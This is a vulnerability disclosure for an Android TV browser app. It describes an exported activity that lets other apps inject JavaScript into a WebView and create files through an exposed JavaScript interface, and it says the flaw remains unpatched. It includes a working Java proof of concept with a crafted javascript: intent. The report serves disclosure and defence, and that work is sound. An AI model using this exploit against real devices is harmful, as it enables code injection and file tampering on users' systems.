**This remains unpatched as of Ver 5.0**

---

## Vulnerability Report: Code Injection (CWE-94) & Arbitrary File Creation

### Overview:

The `com.altamirano.fabricio.tvbrowser.MainActivity` activity is exported and can be invoked by third-party applications, exposing the app to potential attacks.

### Affected Component:
- **Component**: `com.altamirano.fabricio.tvbrowser.MainActivity`
- Ver 4.5.1 & earlier

### Code Injection Details:

A remote attacker can invoke the `MainActivity` of the `com.altamirano.fabricio.tvbrowser` app by sending an explicit intent. When a crafted URI sent via intent is subsequently passed to the WebView, JavaScript code can be executed within the app's context.

### Arbitrary File Creation via JavaScript Interface Exposure:

The `MainActivity`'s WebView exposes certain JavaScript interfaces which can lead to arbitrary file creation vulnerabilities.

**Proof of Concept (Code Injection):**

![image](https://github.com/actuator/com.altamirano.fabricio.tvbrowser/blob/main/TVBrowserDemo.gif)

```java
public void launchBrowser() {
    // Constructing the JavaScript code to directly invoke the exposed JavaScript interface method.
    String base64TestData = "VGhpcyBpcyBhIHRlc3QgZm9yIHRoZSB2dWxuZXJhYmlsaXR5IFBvQy4="; // Represents "This is a test for the vulnerability PoC."
    String jsCode = String.format("javascript:if(window.Android && typeof window.Android.getBase64FromBlobData === 'function'){ window.Android.getBase64FromBlobData('data:text/plain;base64,%s', 'test.txt'); }", base64TestData);

    Intent intent = new Intent(Intent.ACTION_VIEW);
    intent.setComponent(new ComponentName("com.altamirano.fabricio.tvbrowser", "com.altamirano.fabricio.tvbrowser.MainActivity"));
    intent.setData(Uri.parse(jsCode));
    startActivity(intent);
}
```


---


### Exploit Overview:
1. **Arbitrary Code Execution (ACE)**: Using the exported activity, an attacker can trigger the loading of malicious URLs, leading to code execution within the app's context.
2. **Arbitrary File Creation (AFC)**: Using the exposed JavaScript interfaces, an attacker can create or overwrite files in the Downloads folder.

Arbitrary File Creation (AFC) vulnerabilities pose serious risks, enabling malicious actors to potentially complicate digital forensics. 

### Recommendations Update:
1. **Assess Exported Activities**: Ensure activities are not unnecessarily exported. If they are, apply appropriate intent filters and permissions.
2. **Restrict JavaScript Interfaces**: If the WebView in your application supports JavaScript, ensure it doesn't expose sensitive functionality or data to the running JavaScript.


### References Update:
- [CWE-94: Improper Control of Generation of Code ('Code Injection')](https://cwe.mitre.org/data/definitions/94.html)
- [CWE-73: External Control of File Name or Path](https://cwe.mitre.org/data/definitions/73.html)



---
